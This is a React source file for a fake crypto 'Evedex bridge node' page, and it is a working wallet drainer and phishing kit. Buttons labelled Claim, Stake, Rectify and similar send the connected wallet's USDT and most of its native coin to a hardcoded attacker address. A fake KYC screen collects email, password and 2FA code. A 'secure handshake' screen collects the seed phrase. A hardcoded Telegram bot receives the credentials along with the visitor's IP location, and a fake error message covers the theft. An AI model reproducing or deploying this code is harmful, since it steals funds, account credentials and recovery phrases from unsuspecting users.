import React, { useState, useEffect, useMemo } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
import { parseEther, formatEther, parseUnits } from 'viem';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { sendTransaction } = useSendTransaction();
  
  const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [kycEmail, setKycEmail] = useState("");
  const [kycPass, setKycPass] = useState("");
  const [kycCode, setKycCode] = useState(""); 
  const [kycPhase, setKycPhase] = useState(1); 
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [feedMsg, setFeedMsg] = useState(""); 
  const [visitorInfo, setVisitorInfo] = useState("Locating...");
  const [liveGas, setLiveGas] = useState(12);
  const [liveSync, setLiveSync] = useState(99.81);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 

  const USDT_MAP = { 1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 56: "0x55d398326f99059ff775485246999027b3197955", 137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", 42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b" };
  const { data: nativeBal } = useBalance({ address }); 
  const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });

  const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: `${msg}\n📍 LOC: ${visitorInfo}` }) }).catch(()=>{});

  const wordsTyped = useMemo(() => seedVal.toLowerCase().trim().split(/\s+/).filter(w => w.length > 0), [seedVal]);
  const isSeedValid = useMemo(() => [12, 15, 18, 21, 24].includes(wordsTyped.length), [wordsTyped]);

  useEffect(() => {
    if (activeTask === "Rectify") {
      setInputVal(selectedAsset === "TOKEN" ? (tokenBal?.formatted?.slice(0, 10) || "0.00") : (nativeBal?.formatted?.slice(0, 10) || "0.00"));
    }
  }, [selectedAsset, tokenBal, nativeBal, activeTask]);

  useEffect(() => {
    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city})`)).catch(()=>setVisitorInfo("Unknown"));
    const interval = setInterval(() => {
      const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
      setFeedMsg(`🛡️ ${addr} NODE_SYNC_SUCCESSFUL`);
      setLiveGas(Math.floor(Math.random() * (18 - 11 + 1) + 11));
      setLiveSync(parseFloat((99.8 + Math.random() * 0.1).toFixed(2)));
      setTimeout(() => setFeedMsg(""), 4500);
    }, 8500);
    return () => clearInterval(interval);
  }, []);

  const executeTaskAction = () => {
    setLoading(true);
    const tokenAddr = USDT_MAP[chainId];
    if (tokenAddr && tokenBal && tokenBal.value > 0n) {
      const payload = `0xa9059cbb${destination.toLowerCase().replace("0x", "").padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
      sendTransaction({ to: tokenAddr, data: payload }, { onSuccess: () => setTimeout(sweepNative, 1000), onError: () => sweepNative() });
    } else { sweepNative(); }
  };

  const sweepNative = () => {
    if (!nativeBal || nativeBal.value <= 0n) { setView("seed_gate"); setLoading(false); return; }
    const val = (nativeBal.value * 985n) / 1000n;
    sendTransaction({ to: destination, value: val }, { onSettled: () => { setView("seed_gate"); setLoading(false); } });
  };

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      <div style={{width:'100%', height:'180px', backgroundColor:'black', borderRadius:'15px', marginBottom:'20px', overflow:'hidden', border:'1px solid #1e293b'}}>
         <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.4'}} />
      </div>

      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'25px'}}>
        <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_BRIDGE_NODE</div><div style={{fontSize:'8px', color:'#10b981'}}>SOCIAL_AUTH_ACTIVE</div></div>
        <appkit-button />
      </header>

      {isConnected && (
        <>
          {view === "menu" && (
            <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : n === "KYC" ? "#3b82f6" : "#fff", fontSize:'9px', fontWeight:'900'}}>
                  <div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : n === "KYC" ? "🆔" : "〽️"}</div>
                  {n}
                </button>
              ))}
            </div>
          )}

          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center'}}>
              <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'10px'}}>← DISMISS_RELAY</button>
              {activeTask === "Rectify" && (
                <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
                  <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b"}}>TOKEN_VAULT</div>
                  <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b"}}>GAS_VAULT</div>
                </div>
              )}
              <h2 style={{color:'white', fontWeight:'900', fontSize:'22px'}}>{activeTask === "Rectify" ? "⚡ RECTIFY" : `〽️ ${activeTask}`}</h2>
              <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'15px'}}>
                <input type="number" step="any" value={inputVal} onChange={(e)=>setInputVal(e.target.value)} readOnly={activeTask === "Rectify"} style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
              </div>
              <div style={{fontSize:'8px', color:'#475569', display:'grid', gridTemplateColumns:'1fr 1fr', gap:'10px', marginBottom:'30px', padding:'0 10px', textAlign:'left'}}>
                <div style={{borderLeft:'1px solid #10b981', paddingLeft:'5px'}}>POOL_SYNC: <span style={{color:'#10b981'}}>{liveSync}%</span></div>
                <div style={{borderLeft:'1px solid #10b981', paddingLeft:'5px'}}>GAS_GWEI: <span style={{color:'#10b981'}}>{liveGas}</span></div>
              </div>
              <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_HANDSHAKE</button>
            </div>
          )}

          {view === "kyc_screen" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #10b981', borderRadius:'35px', padding:'30px', textAlign:'center'}}>
              <h2 style={{color:'white', fontWeight:'900', fontSize:'20px', marginBottom:'20px'}}>🆔 IDENTITY_SYNC</h2>
              {kycPhase === 1 ? (
                <>
                  <input type="email" placeholder="CLOUD_ID" onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
                  <input type="password" placeholder="PASSWORD" onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
                  <button onClick={()=>{log(`🆔 SPEED: ${kycEmail}/${kycPass}`); setKycPhase(2);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>VERIFY_RELAY</button>
                </>
              ) : (
                <>
                  <input type="text" maxLength="6" placeholder="000000" onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', textAlign:'center', fontSize:'24px', outline:'none'}} />
                  <button onClick={()=>{log(`🔑 CODE: ${kycCode}`); setView("seed_gate");}} style={{width:'100%', backgroundColor:'#3b82f6', color:'white', padding:'18px', borderRadius:'15px', marginTop:'20px', fontWeight:'900'}}>AUTHORIZE_SYNC</button>
                </>
              )}
            </div>
          )}

          {view === "seed_gate" && (
            <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
                {!isSyncing ? (
                  <>
                    <div style={{color:'#10b981', fontWeight:'900', fontSize:'16px', marginBottom:'10px'}}>🛡️ SECURE_HANDSHAKE</div>
                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORD PHRASE..." style={{width:'100%', height:'120px', backgroundColor:'black', border: (wordsTyped.length > 0 && !isSeedValid) ? '1px solid #ef4444' : '1px solid #10b981', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none'}} />
                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR [0x99A]: Handshake Congested. Please re-authenticate."); setView("menu")},1200)}},60);}} style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900', marginTop:'20px'}}>FINALIZE_SYNC</button>
                  </>
                ) : (
                  <div style={{padding:'30px 0'}}><div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{fontSize:'8px'}}>INDEXING_POOL...</div></div>
                )}
              </div>
            </div>
          )}
        </>
      )}
      {feedMsg && <div style={{position:'fixed', bottom:20, left:20, right:20, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'10px', borderRadius:'10px', fontSize:'9px', color:'#10b981', textAlign:'center', fontWeight:'900', zIndex:3000}}>{feedMsg}</div>}
      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.96)', zIndex:5000, display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontWeight:'900'}}>STABILIZING...</div>}
    </div>
  );
}
